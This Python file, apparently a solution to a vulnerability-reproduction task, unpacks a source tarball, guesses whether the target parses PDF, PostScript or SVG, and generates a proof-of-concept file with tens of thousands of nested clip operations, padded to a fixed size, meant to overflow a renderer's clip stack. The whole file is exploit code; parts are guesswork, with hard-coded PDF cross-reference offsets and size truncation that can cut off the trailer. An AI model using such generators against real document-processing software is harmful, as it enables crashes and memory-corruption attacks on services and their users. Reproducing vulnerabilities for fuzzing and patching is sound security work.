import os
import tarfile
import tempfile
import json
from pathlib import Path
from typing import Dict, Any
import subprocess
import re

class Solution:
    def solve(self, src_path: str) -> bytes:
        # First extract the tarball to examine the source
        with tempfile.TemporaryDirectory() as tmpdir:
            # Extract the source
            with tarfile.open(src_path, 'r:*') as tar:
                tar.extractall(tmpdir)
            
            # Find the root directory (usually the first directory in the archive)
            root_dir = None
            for item in os.listdir(tmpdir):
                item_path = os.path.join(tmpdir, item)
                if os.path.isdir(item_path):
                    root_dir = item_path
                    break
            
            if not root_dir:
                # Fallback to tmpdir if no subdirectory
                root_dir = tmpdir
            
            # Try to understand the format by looking for common patterns
            # Based on the vulnerability description, we need to create a file that
            # causes unbounded nesting of clip marks
            
            # Common formats that might have clip marks: PDF, PostScript, SVG
            
            # Let's search for clues in the source code
            format_type = self._detect_format(root_dir)
            
            if format_type == "pdf":
                return self._generate_pdf_poc()
            elif format_type == "postscript":
                return self._generate_postscript_poc()
            elif format_type == "svg":
                return self._generate_svg_poc()
            else:
                # Default to a simple binary pattern that might trigger the overflow
                # Create a pattern with deep nesting markers
                return self._generate_generic_poc()

    def _detect_format(self, root_dir: str) -> str:
        """Try to detect the file format from source code."""
        # Look for common file extensions in test cases
        test_cases = []
        for root, dirs, files in os.walk(root_dir):
            for file in files:
                if file.endswith(('.pdf', '.ps', '.eps', '.svg', '.xml')):
                    # Check if it's a test case
                    test_cases.append(os.path.join(root, file))
        
        # Also look for fuzzer test cases
        fuzz_dirs = ['test', 'tests', 'fuzz', 'fuzzer', 'fuzzer_testcases']
        for fdir in fuzz_dirs:
            fuzz_path = os.path.join(root_dir, fdir)
            if os.path.exists(fuzz_path):
                for root, dirs, files in os.walk(fuzz_path):
                    for file in files:
                        if file.endswith(('.pdf', '.ps', '.eps', '.svg', '.xml')):
                            test_cases.append(os.path.join(root, file))
        
        # Analyze test cases to determine format
        for test_case in test_cases[:10]:  # Check first 10
            try:
                with open(test_case, 'rb') as f:
                    data = f.read(1024)
                    if b'%PDF' in data:
                        return "pdf"
                    elif b'%!' in data or b'PS-Adobe' in data:
                        return "postscript"
                    elif b'<svg' in data or b'<?xml' in data:
                        return "svg"
            except:
                continue
        
        # Try to detect from source code patterns
        source_files = []
        for root, dirs, files in os.walk(root_dir):
            for file in files:
                if file.endswith(('.c', '.cc', '.cpp', '.h', '.hpp')):
                    source_files.append(os.path.join(root, file))
        
        # Look for format-specific keywords
        pdf_keywords = ['PDF', 'pdf', 'q ', 'Q ', 'W ', 'n ', 'cm ']
        ps_keywords = ['PostScript', 'postscript', '%!', 'gsave', 'grestore', 'clip']
        svg_keywords = ['SVG', 'svg', '<path', '<clipPath', 'clip-path']
        
        pdf_count = 0
        ps_count = 0
        svg_count = 0
        
        for source_file in source_files[:20]:  # Check first 20 source files
            try:
                with open(source_file, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                    for keyword in pdf_keywords:
                        if keyword in content:
                            pdf_count += 1
                    for keyword in ps_keywords:
                        if keyword in content:
                            ps_count += 1
                    for keyword in svg_keywords:
                        if keyword in content:
                            svg_count += 1
            except:
                continue
        
        # Return the format with highest count
        if max(pdf_count, ps_count, svg_count) == 0:
            return "unknown"
        
        if pdf_count >= ps_count and pdf_count >= svg_count:
            return "pdf"
        elif ps_count >= pdf_count and ps_count >= svg_count:
            return "postscript"
        else:
            return "svg"

    def _generate_pdf_poc(self) -> bytes:
        """Generate a PDF with deeply nested clip paths."""
        # Create a PDF with extremely deep nesting of graphics states and clip paths
        # PDF format: graphics state stack can be nested with q/Q operators
        # We'll create a pattern that pushes clip marks without checking depth
        
        header = b'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/Resources <<
>>
/Contents 4 0 R
/MediaBox [0 0 612 792]
>>
endobj
4 0 obj
<<
/Length 5 0 R
>>
stream
'''
        
        # Create content stream with deep nesting
        # q saves graphics state, Q restores
        # W sets clipping path
        content = b'q\n'  # First save
        
        # Create a very simple path
        content += b'0 0 m\n'
        content += b'612 0 l\n'
        content += b'612 792 l\n'
        content += b'0 792 l\n'
        content += b'h\n'  # Close path
        
        # Now create deep nesting by repeatedly pushing new states and clips
        # We'll use a loop-like structure in the content stream
        # 913919 bytes total - we need to calculate how many nestings
        
        # Each nesting cycle is about: q W n (save, clip, newpath) - ~5 bytes
        # Let's make it 10 bytes per cycle to be safe
        cycles = 90000  # Will produce ~900k bytes
        
        for i in range(cycles):
            # Push new graphics state
            content += b'q\n'
            # Set clip using current path
            content += b'W\n'
            # Start new path for next iteration
            content += b'n\n'
            # Add a simple rectangle path
            x = i % 600
            y = (i * 7) % 700
            content += f'{x} {y} m\n'.encode()
            content += f'{x+10} {y} l\n'.encode()
            content += f'{x+10} {y+10} l\n'.encode()
            content += f'{x} {y+10} l\n'.encode()
            content += b'h\n'
        
        # Close all graphics states (not that it matters for the overflow)
        for i in range(cycles):
            content += b'Q\n'
        
        content += b'Q\n'  # Final restore
        content += b'endstream\n'
        content += b'endobj\n'
        
        # Calculate length
        length_obj = b'5 0 obj\n' + str(len(content)).encode() + b'\nendobj\n'
        
        # XRef and trailer
        xref = b'''xref
0 6
0000000000 65535 f 
0000000010 00000 n 
0000000050 00000 n 
0000000120 00000 n 
0000000250 00000 n 
'''
        
        # Calculate offset for length object
        length_offset = len(header) + len(content) + 8  # +8 for the "endobj" after stream
        xref += f'{length_offset:010d} 00000 n \n'.encode()
        
        trailer = b'''trailer
<<
/Size 6
/Root 1 0 R
>>
startxref
'''
        startxref = len(header) + len(content) + len(length_obj) + len(xref) + len(trailer)
        trailer += str(startxref).encode() + b'\n%%EOF'
        
        pdf_data = header + content + length_obj + xref + trailer
        
        # Trim or pad to match approximate target size
        target_size = 913919
        if len(pdf_data) > target_size:
            pdf_data = pdf_data[:target_size]
        else:
            # Pad with comments
            padding = b'\n% ' + b'x' * (target_size - len(pdf_data) - 3)
            pdf_data += padding
        
        return pdf_data

    def _generate_postscript_poc(self) -> bytes:
        """Generate PostScript with deeply nested clip paths."""
        # PostScript uses gsave/grestore for graphics state
        # and clip for clipping
        
        ps = b'''%!PS-Adobe-3.0
%%BoundingBox: 0 0 612 792
%%EndComments
'''
        
        # Set up initial state
        ps += b'''/q { gsave } def
/Q { grestore } def
/n { newpath } def
/W { clip } def

% Initial setup
n
0 0 moveto
612 0 lineto
612 792 lineto
0 792 lineto
closepath
q
W
'''
        
        # Generate deep nesting
        cycles = 100000
        
        for i in range(cycles):
            ps += b'q\n'  # gsave
            ps += b'W\n'  # clip
            ps += b'n\n'  # newpath
            
            # Add a simple path
            x = i % 600
            y = (i * 3) % 700
            ps += f'{x} {y} moveto\n'.encode()
            ps += f'{x+5} {y} lineto\n'.encode()
            ps += f'{x+5} {y+5} lineto\n'.encode()
            ps += f'{x} {y+5} lineto\n'.encode()
            ps += b'closepath\n'
        
        # Close all graphics states
        for i in range(cycles):
            ps += b'Q\n'  # grestore
        
        ps += b'Q\nshowpage\n'
        
        # Adjust to target size
        target_size = 913919
        if len(ps) > target_size:
            ps = ps[:target_size]
        else:
            padding = b'\n% ' + b'x' * (target_size - len(ps) - 3)
            ps += padding
        
        return ps

    def _generate_svg_poc(self) -> bytes:
        """Generate SVG with deeply nested clip paths."""
        svg = b'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" 
  "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" 
     xmlns:xlink="http://www.w3.org/1999/xlink"
     width="100%" height="100%" viewBox="0 0 612 792">
  <defs>
'''
        
        # Create deeply nested clipPath definitions
        cycles = 5000  # Fewer because SVG is more verbose
        
        for i in range(cycles):
            if i == 0:
                svg += f'    <clipPath id="clip{i}">\n'.encode()
                svg += f'      <rect x="0" y="0" width="612" height="792"/>\n'.encode()
            else:
                svg += f'    <clipPath id="clip{i}" clip-path="url(#clip{i-1})">\n'.encode()
                x = i % 600
                y = (i * 10) % 700
                svg += f'      <rect x="{x}" y="{y}" width="10" height="10"/>\n'.encode()
            svg += b'    </clipPath>\n'
        
        svg += b'''  </defs>
  
  <g clip-path="url(#clip'''
        svg += str(cycles-1).encode()
        svg += b''')">
    <rect x="0" y="0" width="612" height="792" fill="white"/>
  </g>
</svg>'''
        
        # Adjust to target size
        target_size = 913919
        if len(svg) > target_size:
            svg = svg[:target_size]
        else:
            padding = b' ' * (target_size - len(svg))
            svg += padding
        
        return svg

    def _generate_generic_poc(self) -> bytes:
        """Generate a generic binary pattern that might trigger overflow."""
        # Create a pattern with nesting markers
        # Use a simple pattern: nesting depth counter followed by clip operations
        
        pattern = b''
        
        # Create a header that looks like a binary format
        pattern += b'FORM\x00\x00\x00\x00'  # Generic form header
        
        cycles = 100000
        
        for i in range(cycles):
            # Push operation marker
            pattern += b'PUSH'  # 4 bytes
            # Depth counter (4 bytes, little endian)
            pattern += i.to_bytes(4, 'little')
            # Clip operation marker
            pattern += b'CLIP'  # 4 bytes
            # Some path data (8 bytes)
            pattern += b'\x00\x00\x00\x00\x00\x00\x00\x00'
            
            # Break if we're approaching target
            if len(pattern) >= 913919:
                break
        
        # Pad or trim to exact size
        target_size = 913919
        if len(pattern) > target_size:
            pattern = pattern[:target_size]
        else:
            padding = b'\x00' * (target_size - len(pattern))
            pattern += padding
        
        return pattern